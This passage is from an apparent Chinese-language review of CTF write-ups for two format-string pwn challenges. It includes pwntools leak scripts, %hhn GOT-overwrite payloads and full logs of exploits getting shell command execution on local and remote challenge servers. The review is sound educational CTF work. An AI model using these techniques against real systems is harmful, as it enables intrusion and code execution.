> ⚠️ `context.arch = "amd64"` **一定要在呼叫 `fmtstr_payload()` / `p64()` 之前**設好。沒設的話 pwntools 會用預設的 32-bit 來打包位址，你會看到 `ValueError: pack(): number does not fit within word_size`。同理，`SigreturnFrame()` 也需要它（見 `wp/00` §11.4）。

### [N4] `%n` 家族的「計數」概念沒有獨立小節（併入 [E1]）

pwn2 §3.4 直接跳到「要寫的值 = 印出的字元數，用 `%<寬度>c` 撐到目標值」，中間少了「**計數是整個 printf 呼叫累計的、格式指令本身不算**」這句關鍵，而 §9-5 又給了相反的規則。建議在 §3.4 開頭補：

> **計數器（counter）怎麼算？** `printf` 內部有一個「到目前為止輸出了幾個字元」的計數器，`%n` 就是把這個數字寫出去。
> * 每個 `%c` / `%<寬度>c` 貢獻它的填充長度（`%64c` → +64）；
> * 格式字串裡**不是格式指令**的裸字元貢獻 1 個 / 字元（對齊用的 `aaaaba` → +6）；
> * **格式指令本身不會被印出來、不貢獻任何字元**（`%17$hhn` 貢獻 0，`%64c` 只貢獻 64）。
> 所以 `%64c%17$hhn`:在 `%17$hhn` 執行的那一刻計數是 **64**。

### [N5] pwn2 §3.3 沒給「怎麼把 leak 值對照回 `/proc/<pid>/maps`」的完整腳本

筆記 §3.3 / §5 都說「已用 `/proc/<pid>/maps` 驗證」，但沒給可直接跑的程式。建議補：

> ```python
> from pwn import *
> context.log_level = 'error'
> io = process(['./ld-linux-x86-64.so.2','--library-path','.','./mad_libs'], cwd='.')
> pid = io.pid
> io.recvuntil(b'(1) > ')
> io.sendline(b'|'.join(b'%%%d$p' % i for i in (41, 43, 47)))
> line = io.recvuntil(b'(2) > ', timeout=5)[:-len(b'(2) > ')].strip()
> canary, ret, mainp = (int(x, 16) for x in line.split(b'|'))
> libc_base, pie_base = ret - 0x2a1ca, mainp - 0x11c9
>
> maps = open('/proc/%d/maps' % pid).read()
> def base(name):
>     return int([l for l in maps.splitlines() if name in l][0].split('-')[0], 16)
> print('maps  libc=%#x pie=%#x' % (base('libc.so.6'), base('mad_libs')))
> print('leak  libc=%#x pie=%#x' % (libc_base, pie_base))
> ```
> 實測輸出（兩者必須完全相等，而且都要是 0x1000 的倍數）：
> ```
> maps  libc=0x7fd5a0a00000 pie=0x7fd5a0cd2000
> leak  libc=0x7fd5a0a00000 pie=0x7fd5a0cd2000
> ```

### [N6] pwn3 沒解釋 `_IONBF`（為什麼「輸出一定看得到」）

`pwn3/notes.md:69` 只寫「初始化：對 stdout/stderr 呼叫 `setvbuf(...,_IONBF)`」。建議補一句：

> `_IONBF = 2` 是「**不緩衝**」：每次 `write()` 都立刻送到 socket／終端機。所以我們用 `recvuntil(b'score> ')` 收輸出時不會有「資料卡在 libc 緩衝區」的問題（pwn2 §2.4 也靠同一招）。

### [N7] 「REMOTE 會被 pwntools 吃掉」的說法要跟 `wp/00` 的 `args.REMOTE` 對齊

pwn2 §9-13 / pwn3 §11-1 說「`REMOTE` 會在 `from pwn import *` 之後消失 → **程式會走本機分支**」。實測 `sys.argv` 確實會從 `['-c','REMOTE']` 變成 `['-c']`，但同一時間 `args.REMOTE == True`（pwntools 的官方用法，也正是 `wp/00` §12 教的「常用解題骨架」）。兩份文件擺在一起會讓新手以為互相矛盾。建議兩題各補一句：

> 如果你用的是 pwntools 官方的 `args.REMOTE`（`wp/00` §12 的骨架），那不用理這條 —— `args.REMOTE` 依然會是 `True`。本 exploit 之所以要在 import 前先抄一份 `sys.argv`，是因為它自己解析 `sys.argv[1]`，而那個字串確實會被 `pwnlib.args` 吃掉。

驗證：
```bash
python3 -c "
import sys; print('before:', sys.argv)
from pwn import *
print('after :', sys.argv, 'args.REMOTE =', args.REMOTE)" REMOTE
# before: ['-c', 'REMOTE'] / after : ['-c'] args.REMOTE = True
```

### [N8] pwn3 `read_mem` 的風險沒提（`%N$s` 撞到不可讀位址會直接 SIGSEGV）

`pwn3/exploit.py:128-140` 用「逐 byte 探測」讀記憶體，但筆記沒說：只要 `%N$s` 收到的指標指到**沒映射的頁**，`strlen` 就會 SIGSEGV，整個連線當場死。建議在 §11-3 補一句：

> 逐 byte 探測只適用於「確定整段都在同一個 mapped 區域」的位址（本題都是 `0x400000` 附近的程式/資料段）。如果拿來亂掃，`strlen` 一碰到未映射的頁就 SIGSEGV，連線直接斷 —— 這也是為什麼 exploit 只讀固定的幾個 GOT/COPY 位址。

---

## 3. 與 `wp/00_基礎知識_從零開始.md` 的術語一致性

| 檢查項 | 結果 |
|---|---|
| PIE / Partial RELRO / GOT 可寫 / 小端 / canary / NX | ✅ 三份文件說法一致（pwn2 §1、pwn3 §1.1、wp/00 §4） |
| `p = process(['./ld-linux-x86-64.so.2','--library-path','.','./chal'])` | ✅ wp/00 §12 與 pwn2 §0/§7 完全一致 |
| `FLAG.txt`（真 flag）/ `flag.txt`（假 flag）命名規則 | ✅ wp/00 附錄與 pwn2/pwn3 實測一致（`pwn2/FLAG.txt = sun{f1ll_iN_th3_G0T_eNtry}`、`pwn3/FLAG.txt = sun{cust0m_fmtstr_n0_t00ls_4ll0wed}`） |
| 「一定要 `cd` 進題目目錄」 | ⚠️ wp/00 §12 的警告對本兩題不成立（exploit 用 `os.path.dirname(__file__)` 組絕對路徑）。建議 wp/00 補「本系列的 exploit 已改用絕對路徑，不會受 cwd 影響」 |
| pwn3 的漏洞型態 | ❌ **wp/00:883 / :440 與 pwn3/notes.md §11-7 直接矛盾**（見 [W1]）——這是最需要修的一致性問題 |
| Format String 的辨識與教學指向 | ✅ wp/00 §9.2 指向 `../pwn2/notes.md`，pwn2 確實有完整 `%p`/`%n` 教學 |
| `jg` vs `ja`（有號/無號） | ⚠️ wp/00 §5.2 有 🔴 特別提醒；pwn2 §2.1 只寫 `jle = 「小於等於就跳」`，沒說「有號」。pwn2 的迴圈判斷/數字判斷正好用到 `jle`/`ja`，建議照 wp/00 的措辭補上「（有號）」/「（無號）」 |
| wp/00 名詞表缺少、但 pwn2/pwn3 大量使用的術語 | ❌ `fmtstr_payload` / `FmtStr`（wp/00 §12 pwntools API 清單完全沒列，但 pwn2 的核心就是它）、`IFUNC`、`va_list` / `gp_offset` / `reg_save_area` / `overflow_arg_area`、`setvbuf` / `_IONBF`、`strcspn` / `fgets`、`COPY relocation`（pwn3 有定義 ✅）。建議在 wp/00 名詞表補 `va_list`、`IFUNC` 兩條，並在 §12 補 `fmtstr_payload` 的最小範例，讓 pwn2/pwn3 可以直接引用 |
| `args.REMOTE` vs 自己讀 `sys.argv` | ⚠️ 見 [N7] |
| COPY relocation | ✅ pwn3 §7.1 有白話解釋，wp/00 沒定義但 pwn3 自足，可接受 |

---

## 4. 實測結果（全部為本輪真實輸出）

### 4.1 pwn2 local — **PASS** ✅

```console
$ cd /home/kzzz/Documents/code/ctf/sunshine/pwn2 && python3 exploit.py < /dev/null
[*] === attempt 1/5 ===
[*] starting local process with the bundled loader/libc
[+] Starting local process './ld-linux-x86-64.so.2': pid 3532514
[*] leak line: 0x9291e3fa971e4500|0x7fff75369710|0x7f00c1c2a1ca|0x7f00c1e411c9
[+] canary      = 0x9291e3fa971e4500
[+] saved rbp   = 0x7fff75369710
[+] libc leak   = 0x7f00c1c2a1ca  -> libc base = 0x7f00c1c00000
[+] main leak   = 0x7f00c1e411c9  -> PIE  base = 0x7f00c1e40000
[+] system      = 0x7f00c1c58740
[+] printf@GOT  = 0x7f00c1e44010
[*] write payload (96 bytes): b'%64c%15$hhn%63c%16$hhn%8c%17$n%58c%18$hhn%4c%19$hhnaaaab...'
[*] printf@GOT should now contain system()
sun{LOCAL_DUMMY_FLAG}
total 2396
... uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

FLAG: sun{LOCAL_DUMMY_FLAG}
```
驗算：`0x7f00c1c2a1ca − 0x2a1ca = 0x7f00c1c00000`（頁對齊 ✅）、`0x7f00c1e411c9 − 0x11c9 = 0x7f00c1e40000`（頁對齊 ✅）。
注意：**payload 只有 96 bytes 且含 `%17$n`（4-byte 寫入）**，與 notes §3.4/§8 的「6 個 `%hhn`、112/120 bytes」不同 → 見 [E3]/[E8]。

### 4.2 pwn2 REMOTE — **PASS** ✅

```console
$ python3 exploit.py REMOTE < /dev/null
[*] connecting to chal.sunshinectf.games:26001
[+] Opening connection to chal.sunshinectf.games on port 26001: Done
[*] leak line: 0x2bedfc1b212be700|0x7ffe62974680|0x73979e0201ca|0x58b5447e71c9
[+] canary      = 0x2bedfc1b212be700
[+] saved rbp   = 0x7ffe62974680
[+] libc leak   = 0x73979e0201ca  -> libc base = 0x73979dff6000
[+] main leak   = 0x58b5447e71c9  -> PIE  base = 0x58b5447e6000
[+] system      = 0x73979e04e740
[+] printf@GOT  = 0x58b5447ea010
[*] write payload (96 bytes): b'%64c%15$hhn%51c%16$hhn%36c%17$hhn%7c%18$hhn%1097c%19$hna...'
[*] printf@GOT should now contain system()
sun{f1ll_iN_th3_g0T_eNtry}
total 12
-rw-r----- 1 root mad_libs   27 Sep 26 00:13 flag.txt
uid=1337(mad_libs) gid=1337(mad_libs) groups=1337(mad_libs)
DONE

FLAG: sun{f1ll_iN_th3_g0T_eNtry}
```
（一次遠端執行，attempt 1/5 直接成功。）
真實 flag 與 `pwn2/FLAG.txt` 一致 ✅。**注意 `%1097c%19$hn`：填充 1097 字元，直接推翻 notes §3.4「最多只印 255 個填充字元」** → [E3]。
**遠端確實在一行之後就沒有 `(3) > ` / `score>` 之類的後續輸出**（與 pwn2 §6/§9-7 的說法一致 ✅）。

### 4.3 pwn3 local — **PASS** ✅

```console
$ cd /home/kzzz/Documents/code/ctf/sunshine/pwn3 && python3 exploit.py < /dev/null
[*] mode      : LOCAL /home/kzzz/Documents/code/ctf/sunshine/pwn3/revolution
[*] target libc: local libc /usr/lib/libc.so.6
[+] Starting local process './revolution': pid 3536066
[*] code probe @0x4010d0 = f30f1efa4154ba1f
[+] setvbuf@libc = 0x7fcdc86843f0   ->   libc base = 0x7fcdc8600000
[*] &_IO_2_1_stdout_ = 0x7fcdc8817580 (base+0x217580)
[+] system = 0x7fcdc8654580
[+] strcspn@got overwritten -> main() runs system(buf) on the next line
sun{LOCAL_TEST_FLAG}
sun{LOCAL_TEST_FLAG}          ← 出現兩次（notes §10.1 只寫一次）→ [F6]
total 2204
... uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

score>                        ← 本機不會 SIGSEGV（notes §9.2 說「行程死亡」）→ [F4]
FLAG: sun{LOCAL_TEST_FLAG}
```
本機 Arch libc 的 offset 與 notes §10.1 完全一致：`setvbuf=0x843f0` ✅、`system=0x54580` ✅、`_IO_2_1_stdout_=0x217580` ✅（我用 `readelf`/`ELF.symbols` 另外確認過）。

### 4.4 pwn3 REMOTE — **PASS** ✅（連跑兩次都成功）

```console
$ python3 exploit.py REMOTE < /dev/null
[*] mode      : REMOTE chal.sunshinectf.games:26002
[*] target libc: libc6_2.39-0ubuntu8.3 (Ubuntu 24.04)
[+] Opening connection to chal.sunshinectf.games on port 26002: Done
[*] code probe @0x4010d0 = f30f1efa4154ba1f          ← 與 exploit.py:177 的期望值一致 ✅
[+] setvbuf@libc = 0x77326d6cd540   ->   libc base = 0x77326d645000
[*] &_IO_2_1_stdout_ = 0x77326d8495c0 (base+0x2045c0)   ← 交叉驗證吻合 ✅
[+] system = 0x77326d69d740
[+] strcspn@got overwritten -> main() runs system(buf) on the next line
sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
total 12
... （另有整段 ls -la / 的根目錄列表，notes §10.2 省略了 → [F6]）
uid=1337(revolution) gid=1337(revolution) groups=1337(revolution)
DONE

FLAG: sun{cust0m_fmtstr_n0_t00ls_4ll0wed}
```
`0x77326d6cd540 − 0x88540 = 0x77326d645000`（頁對齊 ✅），且 `stdout` 指標差 `0x2045c0` 完全吻合 ✅ → **遠端 libc 判定正確**。
第二次執行：`setvbuf@libc = 0x7e2944982540 → base 0x7e29448fa000`，同樣 PASS ✅。
遠端在一行命令之後**沒有**再出現 `score> `（與 §9.2 的遠端觀察一致 ✅）。

### 4.5 追加驗證：pwn2 的「鐵證」章節（`/proc/<pid>/mem` 直讀 GOT）— **PASS** ✅

```console
$ python3 - <<'EOF'  (讀 GOT → 寫入 → 再讀 GOT)
maps  libc=0x7f599ce00000 pie=0x7f599d19d000
leak  libc=0x7f599ce00000 pie=0x7f599d19d000  match=True
canary=0x549de5e97a68f100 ends00=True
payload: b'%37c%17$hhn%27c%18$hhn%63c%19$hhn%8c%20$hhn%21c%21$hhn%15c%22$hhnaaaabaa...'
printf@GOT before=0x7f9cab2600f0  (libc printf=0x7f9cab2600f0) match=True
printf@GOT after =0x7f9cab258740  (system    =0x7f9cab258740) match=True
b'SHELL_OK\nuid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)\nDONE\n'
```
→ notes §5 的「鐵證」數字（`printf@GOT = libc+0x600f0`、`after = system`、base 與 `/proc/<pid>/maps` 完全相同、canary 尾 byte 為 00）**全部重現成功** ✅。這次跑出的 payload 剛好是 6 個 `%hhn`（位址 bytes 沒有 `0x00`）。

### 4.6 追加驗證：pwn3 的 `overflow_arg_area == buf` 與 frame 佈局 — **PASS** ✅

（指令見 [F1]/[F2] 的 `gdb -q -batch ... run < /tmp/rev_in`）
```
$1 = 0x7fffffffdac0          ← printf 內部的 rsp
$2 = 0x7fffffffdbe0          ← rsp+0x120
rdi = 0x7fffffffdbe0  r15 = 0x7fffffffdbe0  ← 兩者都等於 buf（"%6$p" 就在這個位址）
0x7fffffffdbe0: 0x0000000070243625
[rsp+0xe8] = 0x7fffffffdbe0  ← 保存的 rbx == buf（在 buf-0x38，不是筆記寫的 buf-0x10）
[buf-0x08] = 0x40113d        ← 返回位址 ✅
```
→ pwn3 §4.1/§6 的核心主張（`overflow_arg_area = rsp+0x120 = buf`）**正確且可重現** ✅；[F1] 的圖錯誤同時被證實。
另外也驗證了 §5 的參數表：`%6$p` 印出 `0x0000000070243625` = `b"%%6$p\x00\x00\x00\x00"` → **arg6 = buf[0..8)** ✅；`%14$p` 在 `buf+0x40` 放 `AAAABBBB` 時印出 `0x4242424241414141` ✅（這段建議寫進筆記，見 [N1]）。

### 4.7 追加驗證：pwn3 §9.2 的對照實驗（read vs system）— **部分 FAIL（文件過度概括）**

```console
setvbuf=0x7ff3d28843f0 base=0x7ff3d2800000  stdout=0x217580
strcspn@got := read  (local)
  round 0 -> b'line0\n'
  round 1 -> b'line1\n'
  round 2 -> b'line2\n'          ← ✅ 與筆記表格「連送三行都存活」一致
strcspn@got := system (local)
  after cmd: b'ONE\nDONE\n\nscore> '     ← ⚠️ 本機沒有 SIGSEGV
  second line survived: b'TWO\n\nscore> ' ← ⚠️ 第二行也執行了
```
→ 「read 版本可連送多行」✅ 正確；「system 版本只能一行」**只在遠端成立**（遠端實測確實一行後就不再回應）→ [F4]。

### 4.8 追加驗證：pwn2 的參數掃描（新手重現路徑）— **PASS** ✅

```console
$ # AAAABBBB + %1$p..%16$p
b'AAAABBBB0x5555907b42a1|0xfbad2088|0x6f84bd5f|0x5555907b42ff|(nil)|(nil)|(nil)|0x4242424241414141|0x2432257c70243125|...'
                                                                 ^^^ pos8 = "AAAABBBB" ✅
$ # %41$p|%42$p|%43$p|%47$p
LEAK: 0x80316cfa3b27bd00|0x7ffc606cffc0|0x7fd5a0a2a1ca|0x7fd5a0cd31c9
maps libc base 0x7fd5a0a00000    ← 0x7fd5a0a2a1ca - 0x2a1ca ✅
maps pie  base 0x7fd5a0cd2000    ← 0x7fd5a0cd31c9 - 0x11c9  ✅
```
→ **pwn2 §4 的暴力法完全可重做**，而且能自己用 `/proc/<pid>/maps` 驗證（這正是任務要求的「新手必須能重做」）✅。

---

## 5. 評分（1–10）與 3 個最有價值的改進

### 評分：**8 / 10**
* **技術正確性 9.5/10**：兩題的核心鏈路我逐條驗證，**沒有任何一個位址、offset、索引、GOT 位置是錯的**（pwn2：`buf=[rbp-0x110]`、canary=`[rbp-8]`、無溢出、`printf(buf)`@0x125f、arg8/arg41/42/43/47、libc `0x2a1ca`、PIE `0x11c9`、`printf@GOT=0x4010`→system 直讀記憶體確認；pwn3：`0x401330`、`overflow_arg_area=rsp+0x120=buf`（gdb 實證）、`%N$s`/`%N$w`、`setvbuf@got=0x404020`→`0x88540`、`strcspn@got=0x404010`→`system 0x58740`、IFUNC 主張亦實測成立）。4 次實測全 PASS。
* **扣分原因**：教學層有 5 個「高」問題（`%n` 計數規則講反、`write_size='byte'` 敘述與事實不符、`printf` frame 圖標錯、pwn3 唯一的直接證據步驟不可執行、`wp/00` 與 pwn3 互相矛盾），這些剛好都落在「新手會照著做」的位置；另有 6 個「中」的圖表/推導/概括錯誤。

### 3 個最有價值的改進
1. **修掉兩個「會讓新手算錯」的知識點：[E1] 的 `%n` 計數規則 + [E3] 的 `write_size_max`。**
   E1 是目前最危險的錯誤——它把「格式指令本身不計數」講成「會計數」，照著手寫 payload 一定失敗，而失敗原因（多算的字元）對新手完全不可見。E3 則讓「照著 §3.4 推理」與「實際跑出的 payload」對不起來。建議同時在 notes 與 `exploit.py` docstring 修正，並補上「用 `/proc/<pid>/mem` 讀回 GOT 檢查最低 byte」的自檢法（我實測有效）。
2. **把 pwn3 §4.1 的證據步驟寫成可直接貼上的指令，並補上「暴力法找 offset」段落（[F2] + [N1]）。**
   pwn3 整題建立在「arg6 = buf」上，而唯一的直接證據現在是不可執行的節錄（`-ex '...'`、`run < <(...)` 在 Ubuntu/dash 會失敗）。補上我實測過的三行 gdb 指令（`printf '%%6$p\n' > /tmp/rev_in` 寫檔避開 `<( )`），再加一段 marker 法（`%6$p` 印出自己的輸入、`%14$p` 印出 `buf+0x40` 的標記），pwn3 才和 pwn2 §4 一樣「新手能自己重做」。
3. **修正三張圖與更新 `wp/00` 對 pwn3 的描述，讓三份文件自洽（[F1]、[F3]、[W1]）。**
   具體：`pwn3/notes.md:628` 的 `buf-0x10` → `buf-0x38`（並把六個 push 的位置列全）、`pwn3/notes.md:583-587` 的 `.init_array/.fini_array` 內容對調（順帶把 `0x401190` 這個「stdio 初始化 = `setvbuf` 一定已解析」的機制補上）、`wp/00:883` 與 `:440` 改成「`va_list.overflow_arg_area` 指向輸入緩衝區 → `%N$s`/`%N$w` 任意讀寫 → GOT 覆寫」。`wp/00` 現在寫的「`.bss` 溢寫 / `memcpy` 長度問題」正是 pwn3 §11-7 花一整節駁斥的內容，會直接誤導照閱讀順序讀下來的新手。

---

### 附：本輪所有驗證指令的執行環境
```
$ file mad_libs → ELF 64-bit LSB pie executable, stripped, BuildID 91b5051...
$ file revolution → ELF 64-bit LSB executable (EXEC), stripped, sha256 918483831ef0b27d0cfb8afa9e0341f38d0a296931ccc5f73ef80f5d610f8fa5
本機 libc = Arch /usr/lib/libc.so.6（setvbuf 0x843f0 / system 0x54580 / stdout 0x217580）
遠端 libc = Ubuntu GLIBC 2.39-0ubuntu8.3（setvbuf 0x88540 / system 0x58740 / stdout 0x2045c0）
python 3.14 + pwntools（pwnlib 位於 ~/.local/lib/python3.14/site-packages/pwnlib）
```
